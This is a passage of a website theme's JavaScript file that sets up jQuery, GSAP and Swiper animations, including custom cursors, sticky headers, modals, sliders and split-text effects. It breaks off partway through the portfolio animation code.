/***************************************************
==================== JS INDEX ======================
****************************************************
00. Preloader
01. Cursor Animations
02. Offcanvas
03. Scroll Top
04. Modals
05. Header 1
06. Header 2
07. Header 3
08. Header 5
09. Header Search
10. Roll Slider
11. Workflow Slider
12. Team Slider
13. Testimonial Slider
14. Testimonial Slider 3
15. Portfolio Slider
16. Service 1
17. Counter
18. Button Hover Animation
19. Button Move Animation
20. Register GSAP
21. Config GSAP
22. Service 6
23. Choose Section
24. Portfolio 5 Animation 
25. Title Animation
26. Title Animation Top
27. Text Animation
28. Text Animation Top
29. Offcanvas Menu
30. Service 3
31. Folks animation
32. Menu Text Animation
33. Main Portfolio Sticky
34. Hero 3 Animation
35. Home Page 2 Animations
36. Award Animation
37. Portfolio Main Slider
38. Portfolio Animation
39. Portfolio Slider 2
40. Portfolio Slider 3
41. Image Moving Animations
42. Counter Animation
43. Workflow Slider Animation | animation__fade
44. Workflow Slider Animation 2 |  fade_bottom
45. Blog animation 
46. Blog animation 2
47. Blog Animation 3
48. Zoom In Animation
49. Service 3 Animation
50. Testimonial 2 Animation
51. Testimonial 3 Image Animation
52. Pricing Table Animation 
53. Service 2 Animation 
54. Hero 1 Animation
55. Service 1 Animation
56. Features 2 Animation 
57. Portfolio 6 Animation 
58. Portfolio 5 Border
59. Portfolio Main Slider
60. Portfolio Slider 6
61. Testimonial Slider 4
62. Team 7
63.Portfolio Slider 7
64. Header 7
65. Service 7 Animation
****************************************************/

(function ($) {
  "use strict";

  // Get Device width
  let device_width = window.innerWidth;

  /////////////////////////////////////////////////////
  // 00. Preloader
  $(document).ready(function () {
    $('.preloader').hide();
  });
  /////////////////////////////////////////////////////

  // 07. Data backgrond
  $("[data-background").each(function () {
    $(this).css("background-image", "url( " + $(this).attr("data-background") + "  )");
  });

  /////////////////////////////////////////////////////
  // HERO - 9

  var testimonial_4 = new Swiper(".hero-9", {
    pagination: {
      el: ".swiper-pagination",
      type: "fraction",
    },
    navigation: {
      nextEl: '.swiper-button-next',
      prevEl: '.swiper-button-prev',
    },
    direction: 'horizontal',
    loop: true,
    slidesPerView: 1,
    spaceBetween: 30,
    mousewheel: false,
    pagination: {
      el: '.swiper-pagination',
      type: 'fraction',
      clickable: true,

      renderFraction: function (currentClass, totalClass) {
        return '<span class="' + currentClass + '"></span>' + ' <span><i class="fa-solid fa-minus increase-dash"></i></span> ' + '<span class="' + totalClass + '"></span>';
      }
    },
    breakpoints: {
      1200: {
        slidesPerView: 1,
      },
      768: {
        slidesPerView: 1,
      },
      320: {
        slidesPerView: 1,
      },
    }
  });



  /////////////////////////////////////////////////////
  // 01. Cursor Animations

  // Home Page Client Cursor
  var client_cursor = document.getElementById("client_cursor");

  // Team Page Team Cursor
  var team_cursor = document.getElementById("team_cursor");

  // Portfolio  Cursor
  var portf_cursor_6 = document.getElementById("portf_cursor_6");

  // Featured  Cursor
  var featured_cursor = document.getElementById("featured_cursor");

  var portfolio4_cursor = document.getElementById("portfolio4_cursor");

  function mousemoveHandler(e) {
    try {
      const target = e.target;

      let tl = gsap.timeline({
        defaults: {
          x: e.clientX,
          y: e.clientY,
        }
      })
      let t2 = gsap.timeline({
        defaults: {
          x: e.clientX,
          y: e.clientY,
        }
      })

      // Home Page Client Cursor
      if (target.closest(".testimonial__img")) {
        tl.to(client_cursor, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(client_cursor, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }

      // Team Page Team Cursor
      if (target.closest(".team__slider")) {
        tl.to(team_cursor, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(team_cursor, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }

      // Portfolio Cursor
      if (target.closest(".portfolio__item-6")) {
        tl.to(portf_cursor_6, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(portf_cursor_6, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }
      // Portfolio Cursor
      if (target.closest(".portfolio__item-6")) {
        tl.to(portf_cursor_6, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(portf_cursor_6, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }

      // featured  Cursor
      if (target.closest(".portfolio__slider-3")) {
        tl.to(featured_cursor, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(featured_cursor, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }

      // featured  Cursor
      if (target.closest(".portfolio__area-5")) {
        tl.to(portfolio4_cursor, {
          opacity: 1,
          ease: "power4.out"
        }, "-=0.3");
      }
      else {
        t2.to(portfolio4_cursor, {
          opacity: 0,
          ease: "power4.out"
        }, "-=0.3");
      }

      // Main Cursor Moving 
      tl.to(".cursor1", {
        ease: "power2.out"
      })
        .to(".cursor2", {
          ease: "power2.out"
        }, "-=0.4")

    } catch (error) {
      console.log(error)
    }

  }
  document.addEventListener("mousemove", mousemoveHandler);
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 02. Offcanvas 
  $("#open_offcanvas").click(function () {
    $('.offcanvas__area').css('opacity', '1');
    $('.offcanvas__area').css('visibility', 'visible');
  });
  $("#close_offcanvas").click(function () {
    $('.offcanvas__area').css('opacity', '0');
    $('.offcanvas__area').css('visibility', 'hidden');
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 03. Scroll Top
  let scroll_top = document.getElementById("scroll_top");
  if (scroll_top) {
    window.onscroll = function () {
      if (document.body.scrollTop > 50 || document.documentElement.scrollTop > 50) {
        scroll_top.style.display = "block";
      } else {
        scroll_top.style.display = "none";
      }
    };

    scroll_top.addEventListener('click', function () {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    });
  }
  ////////////////////////////////////////////////



  /////////////////////////////////////////////////////
  // 04. Modals
  var testimonial = document.querySelector(".testimonial__area");
  if (testimonial) {

    // Testimonial Modal 1
    var modal_testimonial = document.querySelector("#modal_testimonial");
    var modal_trigger = document.querySelector(".modal-trigger");
    var modal_close = document.querySelector("#modal_close");

    modal_trigger.addEventListener("click", function () {
      modal_testimonial.classList.add("modal-show");
    });
    modal_close.addEventListener("click", function () {
      modal_testimonial.classList.remove("modal-show");
    });

    // Testimonial Modal 2
    var modal_testimonial_2 = document.querySelector("#modal_testimonial2");
    var modal_trigger_2 = document.querySelector(".modal-trigger-2");
    var modal_close_2 = document.querySelector("#modal_close2");

    modal_trigger_2.addEventListener("click", function () {
      modal_testimonial_2.classList.add("modal-show");
    });
    modal_close_2.addEventListener("click", function () {
      modal_testimonial_2.classList.remove("modal-show");
    });

    // Testimonial Modal 3
    var modal_testimonial_3 = document.querySelector("#modal_testimonial3");
    var modal_trigger_3 = document.querySelector(".modal-trigger-3");
    var modal_close_3 = document.querySelector("#modal_close3");

    modal_trigger_3.addEventListener("click", function () {
      modal_testimonial_3.classList.add("modal-show");
    });
    modal_close_3.addEventListener("click", function () {
      modal_testimonial_3.classList.remove("modal-show");
    });
  }

  var job_apply = document.querySelector(".job__apply");
  if (job_apply) {

    // application Modal 1
    var modal_application = document.querySelector("#application_form");
    var apply_trigger = document.querySelector(".job__apply");
    var apply_close = document.querySelector("#apply_close");

    apply_trigger.addEventListener("click", function () {
      modal_application.classList.add("modal-show");
    });
    apply_close.addEventListener("click", function () {
      modal_application.classList.remove("modal-show");
    });

    // application Modal 2
    var modal_application_2 = document.querySelector("#application_form2");
    var apply_trigger_2 = document.querySelector(".apply-trigger");
    var apply_close_2 = document.querySelector("#apply_close2");
    var back_form1 = document.querySelector("#back_form1");

    apply_trigger_2.addEventListener("click", function () {
      modal_application_2.classList.add("modal-show");
    });
    apply_close_2.addEventListener("click", function () {
      modal_application_2.classList.remove("modal-show");
      modal_application.classList.remove("modal-show");
    });
    back_form1.addEventListener("click", function () {
      modal_application_2.classList.remove("modal-show");
    });
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 05. Header 1
  if (device_width < 1365) {
    let header_bg = document.querySelector(".header__area");

    if (header_bg) {
      window.onscroll = function () {
        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
          header_bg.style.background = "#121212";
          header_bg.style.setProperty('mix-blend-mode', 'unset');
          if (scroll_top) {
            scroll_top.style.display = "block";
          }
        } else {
          header_bg.style.background = "transparent";
          header_bg.style.setProperty('mix-blend-mode', 'exclusion');
          if (scroll_top) {
            scroll_top.style.display = "none";
          }
        }
      };
    }
  }
  /////////////////////////////////////////////////////



  /////////////////////////////////////////////////////
  // 06. Header 2
  let header_bg_2 = document.querySelector(".header__area-2");
  if (header_bg_2) {
    window.onscroll = function () {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        header_bg_2.style.background = "#121212";
        header_bg_2.classList.add("sticky-2");
        if (scroll_top) {
          scroll_top.style.display = "block";
        }
      } else {
        header_bg_2.style.background = "transparent";
        header_bg_2.classList.remove("sticky-2");
        if (scroll_top) {
          scroll_top.style.display = "none";
        }
      }
    };
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 07. Header 3
  let header_bg_3 = document.querySelector(".header__area-3");
  if (header_bg_3) {
    window.onscroll = function () {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        header_bg_3.classList.add("sticky-3");
        if (scroll_top) {
          scroll_top.style.display = "block";
        }
      } else {
        header_bg_3.classList.remove("sticky-3");
        if (scroll_top) {
          scroll_top.style.display = "none";
        }
      }
    };
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 08. Header 5
  let header_bg_5 = document.querySelector(".header__area-5");
  if (header_bg_5) {
    window.onscroll = function () {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        header_bg_5.classList.add("sticky-5");
        if (scroll_top) {
          scroll_top.style.display = "block";
        }
      } else {
        header_bg_5.classList.remove("sticky-5");
        if (scroll_top) {
          scroll_top.style.display = "none";
        }
      }
    };
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 09. Header Search
  let header_search = document.querySelector(".header__search");
  let search_icon = document.querySelector("#search_icon");
  let search_close = document.querySelector("#search_close");
  if (header_search) {
    search_icon.addEventListener("click", function () {
      header_search.classList.add('open-search');
      search_icon.style.display = 'none';
      search_close.style.display = 'block';
    });

    search_close.addEventListener("click", function () {
      header_search.classList.remove('open-search');
      search_icon.style.display = 'block';
      search_close.style.display = 'none';
    });
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 10. Roll Slider
  var roll_slider = new Swiper(".roll__slider", {
    loop: true,
    freemode: true,
    slidesPerView: 1,
    spaceBetween: 0,
    centeredSlides: true,
    allowTouchMove: false,
    speed: 2000,
    autoplay: {
      delay: 1,
      disableOnInteraction: true,
    },
    breakpoints: {
      640: {
        slidesPerView: 3,
      },
      800: {
        slidesPerView: 3,
      },
      1024: {
        slidesPerView: 4,
      },
      1300: {
        slidesPerView: 5,
      },
      1900: {
        slidesPerView: 8,
      },
    },
  });
  // 10. Roll Slider
  var roll_slider = new Swiper(".roll__slider2", {
    loop: true,
    freemode: true,
    slidesPerView: 1,
    spaceBetween: 60,
    centeredSlides: false,
    allowTouchMove: false,
    speed: 10000,
    autoplay: {
      delay: 1,
      disableOnInteraction: true,
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 11. Workflow Slider
  var workflow_slider = new Swiper(".workflow__slider", {
    loop: true,
    freemode: true,
    slidesPerView: 1,
    spaceBetween: 0,
    speed: 2000,
    breakpoints: {
      640: {
        slidesPerView: 2,
      },
      768: {
        slidesPerView: 2,
      },
      1024: {
        slidesPerView: 3,
      },
      1200: {
        slidesPerView: 4,
      },
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 12. Team Slider
  var team_slider = new Swiper(".team__slider", {
    spaceBetween: 30,
    loop: true,
    freemode: true,
    slidesPerView: 1,
    speed: 2000,
    breakpoints: {
      640: {
        slidesPerView: 2,
      },
      1000: {
        slidesPerView: 3,
      },
      1200: {
        slidesPerView: 4,
      },
    }
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 13. Testimonial Slider
  var testimonial_slider = new Swiper(".testimonial__slider", {
    spaceBetween: 0,
    loop: true,
    freemode: true,
    slidesPerView: 1,
    speed: 2000,

    navigation: {
      nextEl: ".next-button",
      prevEl: ".prev-button",
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 14. Testimonial Slider 3
  var testimonial_slider_3 = new Swiper(".testimonial__slider-3", {
    spaceBetween: 0,
    loop: true,
    freemode: true,
    slidesPerView: 1,
    speed: 2000,

    navigation: {
      nextEl: ".next-button",
      prevEl: ".prev-button",
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 15. Portfolio Slider 
  var total_portfolio_item = $('.portfolio__item-6').length;
  if (total_portfolio_item) {
    $('.portfolio__total').html(total_portfolio_item);
  }

  $(document).on('scroll', function () {
    $('.portfolio__item-6').each(function () {
      if ($(this).position().top <= $(document).scrollTop() && ($(this).position().top + $(this).outerHeight()) > $(document).scrollTop()) {

        var item_num = $(this).data('portfitem');
        $('.portfolio__current').html(item_num);
        $(this).addClass('active').siblings().removeClass('active');
      }
    });
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 16. Service 1
  $('.service__list a:nth-child(1)').addClass('active').siblings().removeClass('acitve');

  $('.service__item').on('mousemove', function (e) {
    var service_id = $(this).data("service");

    $('.service__img.img-' + service_id).addClass('active').siblings().removeClass('active');
    $('.shape-box-' + service_id).addClass('current').siblings().removeClass('current');

    if (service_id != 1) {
      $('.service__list a:nth-child(1)').removeClass('active');
    }
  });


  $('.service__item').on('mouseout', function (e) {
    var service_id = $(this).data("service");

    $('.service__list a:nth-child(' + service_id + ')').addClass('active').siblings().removeClass('active');
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 17. Counter
  const about_counter = window.counterUp.default
  const about_cb = entries => {

    entries.forEach(entry => {
      const el = entry.target
      if (entry.isIntersecting && !el.classList.contains('is-visible')) {
        about_counter(el, {
          duration: 1000,
          delay: 16,
        })
        el.classList.add('is-visible')
      }
    })
  }

  const IO = new IntersectionObserver(about_cb, {
    threshold: 1
  })

  const els = document.querySelectorAll('.counter__number');
  els.forEach((el) => {
    IO.observe(el)
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 18. Button Hover Animation
  $('.btn-hover').on('mouseenter', function (e) {
    var x = e.pageX - $(this).offset().left;
    var y = e.pageY - $(this).offset().top;

    $(this).find('span').css({
      top: y,
      left: x
    });
  });

  $('.btn-hover').on('mouseout', function (e) {
    var x = e.pageX - $(this).offset().left;
    var y = e.pageY - $(this).offset().top;

    $(this).find('span').css({
      top: y,
      left: x
    });
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 19. Button Move Animation
  const all_btns = gsap.utils.toArray(".btn_wrapper");
  if (all_btns.length > 0) {
    var all_btn = gsap.utils.toArray(".btn_wrapper");
  }
  else {
    var all_btn = gsap.utils.toArray("#btn_wrapper");
  }
  const all_btn_cirlce = gsap.utils.toArray(".btn-item");
  all_btn.forEach((btn, i) => {
    $(btn).mousemove(function (e) {
      callParallax(e);
    });
    function callParallax(e) {
      parallaxIt(e, all_btn_cirlce[i], 80);
    }

    function parallaxIt(e, target, movement) {
      var $this = $(btn);
      var relX = e.pageX - $this.offset().left;
      var relY = e.pageY - $this.offset().top;

      gsap.to(target, 0.5, {
        x: ((relX - $this.width() / 2) / $this.width()) * movement,
        y: ((relY - $this.height() / 2) / $this.height()) * movement,
        ease: Power2.easeOut,
      });
    }
    $(btn).mouseleave(function (e) {
      gsap.to(all_btn_cirlce[i], 0.5, {
        x: 0,
        y: 0,
        ease: Power2.easeOut,
      });
    });
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 20. Register GSAP
  gsap.registerPlugin(ScrollTrigger, ScrollSmoother, TweenMax, ScrollToPlugin);
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 21. Config GSAP
  gsap.config({
    nullTargetWarn: false,
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 22. Service 6
  if (device_width > 1200) {
    gsap.to(".service__list-6", {
      scrollTrigger: {
        trigger: ".service__area-6",
        pin: ".service__list-6",
        pinSpacing: true,
        start: "top top",
        end: "bottom bottom"
      }
    })

    gsap.to(".service__image-wrap", {
      scrollTrigger: {
        trigger: ".service__area-6",
        pin: ".mid-content",
        pinSpacing: true,
        start: "top top",
        end: "bottom bottom",
        markers: false
      }
    })

    let service_images = gsap.utils.toArray(".service__image")
    let service_imagess = gsap.utils.toArray(".service__image img")
    let service_items = gsap.utils.toArray(".service__item-6")

    if (service_items) {
      service_items.forEach((image, i) => {
        console.log(service_images[i].img)
        let tl = gsap.timeline({
          scrollTrigger: {
            trigger: image,
            scrub: 1,
            start: "top top-=600",
            markers: false,
          }
        });
        tl.to(service_images[i], {
          zIndex: "1",
        })
        tl.to(service_imagess[i], {
          opacity: 0,
          duration: 1,
          scale: 1.2,
          ease: "power4.out"
        }, "-=1")
      })
    }

    let navItems = gsap.utils.toArray(".service__list-6 li a")
    if (navItems) {
      navItems.forEach((nav) => {
        nav.addEventListener("click", (e) => {
          e.preventDefault();
          const ids = nav.getAttribute("href")
          gsap.to(window, { duration: 0.5, scrollTo: ids, ease: "power4.out" });
        })
      })
    }

    // Active Nav
    $(document).on('scroll', function () {
      $('.service__item-6').each(function () {
        if ($(this).position().top <= $(document).scrollTop() && ($(this).position().top + $(this).outerHeight()) > $(document).scrollTop()) {
          var sec_id = $(this).data('secid');

          $('.service__list-6 li:nth-child(' + sec_id + ')').addClass('active').siblings().removeClass('active');
        }
      });
    });
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 23. Choose Section
  if (device_width > 1200) {

    var workflow_section_3 = document.querySelector('.workflow__wrapper-3');
    if (workflow_section_3) {

      let duration = 1,
        sections = gsap.utils.toArray(".wf_panel"),
        sectionIncrement = duration / (sections.length - 1),
        tl = gsap.timeline({
          scrollTrigger: {
            trigger: ".workflow__wrapper-3",
            pin: true,
            scrub: 1,
            start: "top top",
            end: "+=5000"
          }
        });

      tl.to(sections, {
        xPercent: -100 * (sections.length - 1),
        duration: duration,
        ease: "none"
      });

      sections.forEach((section, index) => {
        let tween = gsap.from(section, {
          opacity: 0,
          scale: 0.6,
          duration: 0.5,
          force3D: true,
          paused: true
        });
        addSectionCallbacks(tl, {
          start: sectionIncrement * (index - 0.99),
          end: sectionIncrement * (index + 0.99),
          onEnter: () => tween.play(),
          onLeave: () => tween.reverse(),
          onEnterBack: () => tween.play(),
          onLeaveBack: () => tween.reverse()
        });
        index || tween.progress(1);
      });

      function addSectionCallbacks(timeline, { start, end, param, onEnter, onLeave, onEnterBack, onLeaveBack }) {
        let trackDirection = animation => {
          let onUpdate = animation.eventCallback("onUpdate"),
            prevTime = animation.time();
          animation.direction = animation.reversed() ? -1 : 1;
          animation.eventCallback("onUpdate", () => {
            let time = animation.time();
            if (prevTime !== time) {
              animation.direction = time < prevTime ? -1 : 1;
              prevTime = time;
            }
            onUpdate && onUpdate.call(animation);
          });
        },
          empty = v => v;
        timeline.direction || trackDirection(timeline);
        start >= 0 && timeline.add(() => ((timeline.direction < 0 ? onLeaveBack : onEnter) || empty)(param), start);
        end <= timeline.duration() && timeline.add(() => ((timeline.direction < 0 ? onEnterBack : onLeave) || empty)(param), end);
      }
    }
  }
  /////////////////////////////////////////////////////


  if (device_width > 100) {

    /////////////////////////////////////////////////////
    // 24. Portfolio 5 Animation 
    let skewSetter = gsap.quickTo(".portfolio__item-5 img", "skewY"),
      clamp = gsap.utils.clamp(-15, 15);
    const smoother = ScrollSmoother.create({
      smooth: 1.35,
      effects: device_width < 1025 ? false : true,
      smoothTouch: false,
      normalizeScroll: false,
      ignoreMobileResize: true,
      onUpdate: self => skewSetter(clamp(self.getVelocity() / -80)),
      onStop: () => skewSetter(0)
    });

    /////////////////////////////////////////////////////


    ///////////////////////////////////////////////////// 
    // 25. Title Animation
    let splitTitleLines = gsap.utils.toArray(".title-anim");

    splitTitleLines.forEach(splitTextLine => {
      const tl = gsap.timeline({
        scrollTrigger: {
          trigger: splitTextLine,
          start: 'top 90%',
          end: 'bottom 60%',
          scrub: false,
          markers: false,
          toggleActions: 'play none none none'
        }
      });

      const itemSplitted = new SplitText(splitTextLine, { type: "words, lines" });
      gsap.set(splitTextLine, { perspective: 400 });
      itemSplitted.split({ type: "lines" })
      tl.from(itemSplitted.lines, { duration: 1, delay: 0.3, opacity: 0, rotationX: -80, force3D: true, transformOrigin: "top center -50", stagger: 0.1 });
    });
    /////////////////////////////////////////////////////


    /////////////////////////////////////////////////////
    // 26. Title Animation Top

    /////////////////////////////////////////////////////


    /////////////////////////////////////////////////////
    // 27. Text Animation
    let splitTextLines = gsap.utils.toArray(".text-anim p");

    splitTextLines.forEach(splitTextLine => {
      const tl = gsap.timeline({
        scrollTrigger: {
          trigger: splitTextLine,
          start: 'top 90%',
          duration: 2,
          end: 'bottom 60%',
          scrub: false,
          markers: false,
          toggleActions: 'play none none none'
        }
      });

      const itemSplitted = new SplitText(splitTextLine, { type: "lines" });
      gsap.set(splitTextLine, { perspective: 400 });
      itemSplitted.split({ type: "lines" })
      tl.from(itemSplitted.lines, { duration: 1, delay: 0.5, opacity: 0, rotationX: -80, force3D: true, transformOrigin: "top center -50", stagger: 0.1 });
    });
    /////////////////////////////////////////////////////


    /////////////////////////////////////////////////////
    // 28. Text Animation Top
    let text_anim_top = gsap.utils.toArray(".text-anim-top");

    text_anim_top.forEach(splitTextLine2 => {
      const tl = gsap.timeline({
        scrollTrigger: {
          trigger: splitTextLine2,
          start: 'top 100%',
          toggleActions: 'play none play reset'
        }
      });

      const itemSplitted = new SplitText(splitTextLine2, { type: 'words' }),
        textNumWords = itemSplitted.words.length;

      gsap.delayedCall(0.05, function () {
        for (var i = 0; i < textNumWords; i++) {
          tl.from(itemSplitted.words[i], 1, { force3D: true, scale: Math.random() > 0.5 ? 0 : 2, opacity: 0 }, Math.random());
        }
      });
    });
    /////////////////////////////////////////////////////
  }



  jQuery(document).ready(function () {
    /////////////////////////////////////////////////////
    // 29. Offcanvas Menu
    $('.offcanvas__menu').meanmenu({
      meanScreenWidth: "5000",
      meanMenuContainer: '.offcanvas__menu-wrapper',
      meanMenuCloseSize: '36px',
    });
    /////////////////////////////////////////////////////
  });


  /////////////////////////////////////////////////////
  // 30. Service 3
  const serviceImgItem = document.querySelectorAll(".service__item-3");

  function followImageCursor(event, serviceImgItem) {
    const contentBox = serviceImgItem.getBoundingClientRect();
    const dx = event.clientX - contentBox.x;
    const dy = event.clientY - contentBox.y;
    serviceImgItem.children[3].style.transform = `translate(${dx}px, ${dy}px)`;
  }

  serviceImgItem.forEach((item, i) => {
    item.addEventListener("mousemove", (event) => {
      setInterval(followImageCursor(event, item), 1000);
    });
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 31. Folks animation
  let endTl = gsap.timeline({
    repeat: -1,
    delay: 0.5,
    scrollTrigger: {
      trigger: '.end',
      start: 'bottom 100%-=50px'
    }
  });
  gsap.set('.end', {
    opacity: 0
  });
  gsap.to('.end', {
    opacity: 1,
    duration: 1,
    ease: 'power2.out',
    scrollTrigger: {
      trigger: '.end',
      start: 'bottom 100%-=50px',
      once: true
    }
  });
  let mySplitText = new SplitText(".end", { type: "words,chars" });
  let chars = mySplitText.chars;
  let endGradient = chroma.scale(['#F9D371', '#F47340', '#EF2F88', '#8843F2']);
  endTl.to(chars, {
    duration: 0.5,
    scaleY: 0.6,
    ease: "power3.out",
    stagger: 0.04,
    transformOrigin: 'center bottom'
  });
  endTl.to(chars, {
    yPercent: -20,
    ease: "elastic",
    stagger: 0.03,
    duration: 0.8
  }, 0.5);
  endTl.to(chars, {
    scaleY: 1,
    ease: "elastic.out(2.5, 0.2)",
    stagger: 0.03,
    duration: 1.5
  }, 0.5);
  endTl.to(chars, {
    color: (i, el, arr) => {
      return endGradient(i / arr.length).hex();
    },
    ease: "power2.out",
    stagger: 0.03,
    duration: 0.3
  }, 0.5);
  endTl.to(chars, {
    yPercent: 0,
    ease: "back",
    stagger: 0.03,
    duration: 0.8
  }, 0.7);
  endTl.to(chars, {
    color: '#c9f31d',
    duration: 1.4,
    stagger: 0.05
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 32. Menu Text Animation
  document.querySelectorAll('.menu-anim > li > a').forEach(button => button.innerHTML = '<div class="menu-text"><span>' + button.textContent.split('').join('</span><span>') + '</span></div>');

  setTimeout(() => {
    var menu_text = document.querySelectorAll(".menu-text span")
    menu_text.forEach((item) => {
      var font_sizes = window.getComputedStyle(item, null);
      let font_size = font_sizes.getPropertyValue("font-size");
      let size_in_number = parseInt(font_size.replace("px", ""));
      let new_size = parseInt(size_in_number / 3)
      new_size = new_size + "px"
      if (item.innerHTML == " ") {
        item.style.width = new_size
      }
    })
  }, 1000)
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 33. Main Portfolio Sticky
  ScrollTrigger.create({
    trigger: ".portfolio__wrapper-6",
    start: "top top",
    end: "bottom bottom",
    pin: ".portfolio__title-wrap-6",
    pinSpacing: false,
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 34. Hero 3 Animation
  const radio_buttons = document.querySelector("#video_check");
  const video_start = document.querySelector(".hero__area-3");

  if (radio_buttons) {
    radio_buttons.addEventListener('click', function () {
      let video = document.querySelector(".video-title")
      let videoClose = document.querySelector(".video-title.close-video-title")
      if (radio_buttons.checked) {
        document.querySelector(".wrapper").style.zIndex = "1";
        video.style.display = "none";
        videoClose.style.display = "block";
        video_start.classList.add('start-video');
        document.querySelector('.header__area-3').classList.add('bg-white');

      }
      else {
        document.querySelector(".wrapper").style.zIndex = "999";
        video.style.display = "block";
        videoClose.style.display = "none";
        video_start.classList.remove('start-video');
        document.querySelector('.header__area-3').classList.remove('bg-white');
      }
    });
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 35. Home Page 2 Animations
  let tHero = gsap.timeline()

  let heading_title = new SplitText(".sec-title-3", { type: "chars" })
  let heading_char = heading_title.chars

  tHero.from(heading_char, {
    rotate: 20,
    ease: "back.out",
    opacity: 0,
    duration: 2,
    stagger: 0.1
  })

  tHero.from(".hero2-shape img", {
    xPercent: -100,
    duration: 1,
  }, '-=6.5')

  tHero.from(".hero__text-2 p", {
    opacity: 0,
    x: -30,
    duration: 1.5
  }, '-=5')

  var hero_bts = document.querySelector(".hero__text-2 .btn_wrapper")
  if (hero_bts) {
    var hero_btn = document.querySelector(".hero__text-2 .btn_wrapper")
  }
  else {
    var hero_btn = document.querySelector(".hero__text-2 #btn_wrapper")
  }
  tHero.from(hero_btn, {
    opacity: 0,
    y: -70,
    ease: "bounce",
    duration: 1.5
  }, '-=5')

  // All Buttons 
  let arr1 = gsap.utils.toArray("#btn_wrapper")
  let arr2 = gsap.utils.toArray(".btn_wrapper")
  const all_buttons = arr1.concat(arr2);

  all_buttons.forEach((btn) => {
    if (!(btn.classList.contains("hero__button"))) {
      gsap.from(btn, {
        scrollTrigger: {
          trigger: btn,
          start: "top center+=150",
          markers: false,
        },
        opacity: 0,
        y: -70,
        ease: "bounce",
        duration: 1.5,
      })
    }
  })

  let imageTl = gsap.timeline({
    scrollTrigger: {
      trigger: ".about__img-2",
      start: "top bottom",
      markers: false,
      scrub: 1,
      end: "bottom center"
    }
  })

  // Image pin 
  imageTl.to(".about__img-2 img", {
    scale: 1.15,
    duration: 1,
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 36. Award Animation
  let award_timeline = gsap.timeline({
    scrollTrigger: {
      trigger: ".award__text",
      start: "top center+=150",
    }
  })

  gsap.set(".award__text", {
    opacity: 0,
    y: -500,
  })
  award_timeline.to(".award__text", {
    opacity: 1,
    y: 0,
    duration: 2,
    ease: "bounce",
  })

  gsap.set(".award__text-2", { opacity: 0, y: -500 })

  award_timeline.to(".award__text-2", {
    opacity: 1,
    y: 0,
    duration: 2,
    ease: "bounce"
  }, "-=1.5")

  award_timeline.to(".award__text", {
    x: -100,
    duration: 2,
  }, "-=1")
  award_timeline.to(".award__text-2", {
    x: -100,
    duration: 2,
  }, "-=1")
  award_timeline.to(".award__text", {
    x: 0,
    duration: 2,
  }, "-=1")
  award_timeline.to(".award__text-2", {
    x: 0,
    duration: 2,
  }, "-=1")
  /////////////////////////////////////////////////////



  /////////////////////////////////////////////////////
  // 38. Portfolio Animation
  if (device_width > 767) {
    let portfolioline = gsap.timeline({
      scrollTrigger: {
        trigger: ".portfolio__area",
        start: "top center-=200",
        pin: ".portfolio__text",
        end: "bottom bottom+=80",
        markers: false,
        pinSpacing: false,
        scrub: 1,
      }
    })

    portfolioline.to(".portfolio__text", {
      scale: 3,
      duration: 1
    })
    portfolioline.to(".portfolio__text", {
      scale: 3,
      duration: 1
    })
    portfolioline.to(".portfolio__text", {
      scale: 1,
      duration: 1
    }, "+=2")
  }


  let portfolio_lists = gsap.utils.toArray(".portfolio__item")
  portfolio_lists.forEach((portfolio, i) => {
    gsap.set(portfolio, { opacity: 0.7 })
    let t1 = gsap.timeline()

    t1.set(portfolio, {
      position: "relative",
    })
    t1.to(portfolio, {
      scrollTrigger: {
        trigger: portfolio,
        scrub: 2,
        duration: 1.5,
        start: "top bottom+=100",
        end: "bottom center",
        markers: false
      },
